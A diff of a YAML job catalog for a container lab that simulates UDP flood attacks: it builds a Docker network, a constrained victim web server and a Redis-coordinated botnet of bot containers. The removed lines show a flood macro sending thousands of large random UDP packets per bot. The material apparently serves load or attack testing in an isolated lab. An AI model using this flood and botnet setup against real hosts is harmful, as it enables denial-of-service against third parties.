@@ -2,41 +2,48 @@ spec: v1.0
 desc: Catalog with UDP flood attacks.
 
 dataset:
-  - const: src
-    desc: Dir where the source templates are.
-    value: $(__dir)/_$(__catalogName)
-    tags: [hidden]
-
-  - const: dst
-    desc: Local directory where to save the files.
-    value: $(workDir)
+  - input: netDriver
+    title: Network driver to use
+    defaultValue: bridge
 
   - const: net
     desc: Data on the network to use.
     value:
       name: udp-flood
-      driver: bridge
+      driver: $(netDriver)
 
   - const: victim
     desc: Victim data, that is, the container to be attacked.
     value:
       container: udp-victim
       image: httpd:alpine
-      maxSockets: 4
       memory: 6m
       cores: 1
-
-  - const: bot
-    desc: Bot data, that is, the containers to be the bots
+  
+  - const: botnet
+    desc: Botnet data, that is, the containers of the botnet.
     value:
-      container: udp-bot
-      image: akromio/gattuso:latest
-      botnetSize: 15
-      msg:
-        count: 15000 # messages/bot to send
-        size:
-          min: 29000
-          max: 30000
+      size: 5 # number of bots
+      broker:
+        container: redis
+        image: redis:alpine
+      mgr:
+        container: carboni
+        image: akromio/carboni:latest
+      bot:
+        container: cavani
+        image: akromio/cavani:latest
+        msg:
+          count: 15000 # messages/bot to send
+          size:
+            min: 29000
+            max: 30000
+
+plugins:
+  - plugin: redis
+    ini:
+      host: localhost
+      port: 6379
 
 jobs:
   - group: env
@@ -47,7 +54,6 @@ jobs:
           - create-net
           - create-victim
           - create-botnet
-          - ping
 
       - macro: remove-env
         title: Remove the Docker environment
@@ -61,12 +67,12 @@ jobs:
       - macro: create-net
         title: Create the Docker network
         steps:
-          - exec sudo docker network create $(net.name) -d $(net.driver)
+          - sudo: docker network create $(net.name) -d $(net.driver)
 
       - macro: remove-net
         title: Remove the Docker network
         steps:
-          - exec sudo docker network rm $(net.name)
+          - sudo: docker network rm $(net.name)
 
   - group: victim
     jobs:
@@ -74,8 +80,6 @@ jobs:
         title: Create the victim container
         ini: exec sudo docker pull $(victim.image)
         dataset:
-          - const: sysctl
-            value: --sysctl net.core.somaxconn=$(victim.maxSockets)
           - const: network
             value: --network $(net.name)
           - const: memory
@@ -87,7 +91,7 @@ jobs:
           - const: mount
             value: -v /usr/share/doc/gdisk:/usr/local/apache2/htdocs/
         steps:
-          - exec sudo docker run $(name) $(cpus) $(memory) $(network) $(sysctl) $(mount) -p 8080:80 -d $(victim.image)
+          - sudo: docker run $(name) $(cpus) $(memory) $(network) $(mount) -p 8080:80 -d $(victim.image)
           - show-victim-conf
 
       - macro: show-victim-conf
@@ -99,49 +103,79 @@ jobs:
       - macro: remove-victim
         title: Remove the victim container
         steps:
-          - exec sudo docker rm -f $(victim.container)
+          - sudo: docker rm -f $(victim.container)
 
   - group: botnet
+    dataset:
+      - const: network
+        desc: Network option for docker run.
+        value: --network=$(net.name)
+      - const: volume
+        desc: Volume option for docker run
+        value: -v $(workDir)/registry:/registry
     jobs:
       - macro: create-botnet
-        title: Create the bot containers
-        ini: exec sudo docker pull $(bot.image)
-        forEach: $i = range 1 $(bot.botnetSize)
-        dataset:
-          - input: at
-            desc: (Date and) time when to start the attack.
-          - const: network
-            value: --network=$(net.name)
-          - const: volume
-            value: -v $(workDir)/registry:/registry
-          - const: command
-            value: gattuso -c udp-flood r attack -a at=$(at)
+        title: Create the botnet
         steps:
-          - quiet: $name = text --name=$(bot.container)$(i)
-          - exec sudo docker run $(name) $(network) $(volume) -id $(bot.image) $(command)
-
+          - create-broker
+          - create-bots
+          - create-mgr
+      
       - macro: remove-botnet
+        title: Remove the botnet
+        steps:
+          - remove-bots
+          - remove-mgr
+          - remove-broker
+      
+      - macro: create-broker
+        title: Create the broker of the botnet
+        # ini:
+        #   - sudo: docker pull $(botnet.broker.image)
+        steps:
+          - sudo: docker run --name $(botnet.broker.container) $(network) --rm -d -p 6379:6379 $(botnet.broker.image)
+          - sleep 1s
+          - redis.ping
+      
+      - macro: remove-broker
+        title: Remove the broker of the botnet
+        steps:
+          - sudo: docker rm -f $(botnet.broker.container)
+      
+      - macro: create-mgr
+        title: Create the manager of the botnet
+        dataset:
+          - const: name
+            value: $(botnet.mgr.container)
+          - const: image
+            value: $(botnet.mgr.image)
+        ini: exec sudo docker pull $(botnet.mgr.image)
+        steps:
+          - sudo: docker run --name $(name) $(network) $(volume) --rm -d $(image) carboni r -n $(name) pause warmup load exit
+          - sudo: docker exec -i $(name) redis-cli -h $(botnet.broker.container) redis-cli PING
+      
+      - macro: remove-mgr
+        title: Remove the manager of the botnet
+        steps:
+          - sudo: docker rm $(botnet.mgr.container)
+      
+      - macro: create-bots
+        title: Create the bot containers
+        # ini: exec sudo docker pull $(botnet.bot.image)
+        forEach: $i = range 1 $(botnet.size)
+        steps:
+          - quiet: $name = text $(botnet.bot.container)$(i)
+          - log: redis.xgroup.create $(name) $(name) $ MKSTREAM
+          - sudo: docker run --name $(name) $(network) $(volume) --rm -d $(botnet.bot.image) cavani r
+          - sudo: docker exec -i $(botnet.bot.container) redis-cli -h $(botnet.broker.container) PING
+
+      - macro: remove-bots
         title: Remove the bot containers
-        forEach: $i = range 1 $(bot.botnetSize)
+        forEach: $i = range 1 $(botnet.size)
         steps:
-          - exec sudo docker rm -f $(bot.container)$(i)
-
-      - macro: attack
-        title: Perform an attack
-        ini: sleep.until $(args.at)
-        forEach: $i = range 1 $(bot.msg.count)
-        dataset: [msg, port]
-        steps:
-          - banner $(i)
-          - $msg = random.text $(bot.msg.size.min) $(bot.msg.size.max)
-          - $port = random 55000 60000
-          - udp.send $(msg) $(victim.container) $(port)
-
-  - macro: ping
-    title: Ping from bot to victim
-    forEach: $i = range 1 $(bot.botnetSize)
-    steps:
-      - exec sudo docker exec -i $(bot.container)$(i) ping -q -c 2 $(victim.container)
+          - quiet: $name = text $(botnet.bot.container)$(i)
+          - log: redis.xgroup.destroy $(name) $(name)
+          - sudo: docker rm -f $(name)
 
   - macro: latency
     title: Check latency to victim
